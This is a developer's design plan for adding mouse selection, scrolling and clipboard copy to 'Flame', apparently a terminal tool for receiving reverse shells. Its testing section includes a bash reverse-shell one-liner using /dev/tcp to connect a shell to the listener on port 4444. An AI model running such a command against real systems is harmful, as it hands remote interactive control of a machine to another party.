# Mouse Selection Engine Plan

## Overview
Implement mouse-based text selection + scroll in Flame's output pane, inspired by Crush but simplified for our single-pane architecture.

## Why We Don't Need Ultraviolet
Crush has a 5-layer system because it handles a **list of messages** (each with borders, padding, expansion, individual highlighting). Flame has a **single scrollable output pane** — all content is one continuous text buffer. This means we can implement selection with simple line/column math + ANSI manipulation.

## Architecture

### Mouse Events (Bubble Tea v1)
```go
case tea.MouseMsg:
    switch msg.Type {
    case tea.MouseLeft:        // Button press
    case tea.MouseRelease:     // Button release
    case tea.MouseMotion:      // Motion while pressed
    case tea.MouseWheelUp:     // Scroll up
    case tea.MouseWheelDown:   // Scroll down
    }
    // msg.X, msg.Y = cell coordinates (0-based)
```

### Selection State (in OutputPane)
```go
type Selection struct {
    Active    bool       // Currently selecting (mouse down)
    HasRange  bool       // Selection exists (for rendering)
    StartLine int        // Content line (not viewport line)
    StartCol  int        // Column in content
    EndLine   int        // Content line
    EndCol    int        // Column in content
}
```

### Coordinate Translation
```
Viewport Y → Content Line:
    contentLine = viewportY + scrollOffset

Mouse Position → Selection Position:
    1. Get viewport-relative coordinates (subtract output pane origin from layout)
    2. Add scroll offset to Y to get content line
    3. X is the column (need ANSI-aware width calculation)
```

### Rendering with Highlights
During `View()`, process visible lines:
```
For each visible line:
    If line is in selection range:
        Calculate highlight start/end columns for this line
        Split line into: before | highlighted | after
        Apply ANSI reverse video to highlighted portion
        Rejoin
```

ANSI reverse: `\033[7m` (enable) + `\033[27m` (disable)
Must be ANSI-aware when calculating column positions (skip escape sequences).

### Text Extraction on Mouse Up
```
1. Determine selection direction (forward vs backward)
2. Normalize: ensure start < end
3. Walk content lines from startLine to endLine
4. Extract text (strip ANSI codes for plain text)
5. Copy to clipboard:
   - OSC 52: works over SSH (tea.SetClipboard or raw escape)
   - Native: golang.design/x/clipboard or similar
```

### Multi-Click Detection
```
Track: lastClickTime, lastClickX, lastClickY, clickCount

On MouseDown:
    if (now - lastClickTime) < 400ms AND distance < 2px:
        clickCount++
    else:
        clickCount = 1

    switch clickCount:
        case 1: start drag selection
        case 2: select word (find word boundaries)
        case 3: select entire line
```

### Word Boundary Detection
Simple approach (no UAX#29 needed for shell output):
```go
func findWordBoundaries(line string, col int) (start, end int) {
    // Walk left until whitespace/special char
    // Walk right until whitespace/special char
    // Word chars: alphanumeric + _-./
}
```

### Mouse Event Filter (Optional)
Throttle motion events to prevent trackpad spam:
```go
var lastMouseEvent time.Time
const mouseThrottle = 15 * time.Millisecond

// In Update():
case tea.MouseMsg:
    if msg.Type == tea.MouseMotion {
        if time.Since(lastMouseEvent) < mouseThrottle {
            return a, nil // Drop
        }
        lastMouseEvent = time.Now()
    }
```

## Clipboard Strategy

### OSC 52 (Primary — works over SSH!)
```go
// Write to system clipboard via terminal escape
fmt.Fprintf(os.Stdout, "\033]52;c;%s\033\\", base64.StdEncoding.EncodeToString([]byte(text)))
```

### Native Clipboard (Fallback)
```go
// Using exec:
cmd := exec.Command("xclip", "-selection", "clipboard")
cmd.Stdin = strings.NewReader(text)
cmd.Run()

// Or wl-copy for Wayland:
cmd := exec.Command("wl-copy", text)
cmd.Run()
```

## Implementation Order
1. Mouse scroll (wheel events → viewport scroll) — likely already working
2. Mouse drag selection (press → motion → release)
3. Visual highlight rendering (reverse video in View())
4. Text extraction + clipboard copy
5. Double-click word selection
6. Triple-click line selection
7. Mouse event throttling

## Files to Modify
- `internal/tui/outputpane.go` — Add Selection state, highlight rendering, mouse handlers
- `internal/tui/app.go` — Route mouse events to output pane with coordinate translation
- `internal/tui/clipboard.go` (NEW) — OSC 52 + native clipboard helpers

## Testing
```bash
# Build and run
go build -o flame . && ./flame -ip 127.0.0.1 -p 4444

# In another terminal, connect a shell
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# In TUI:
# 1. Type "help" to generate output
# 2. Try scrolling with mouse wheel
# 3. Click and drag to select text
# 4. Release → text should be in clipboard
# 5. Double-click on a word → word selected
# 6. Triple-click → line selected
```
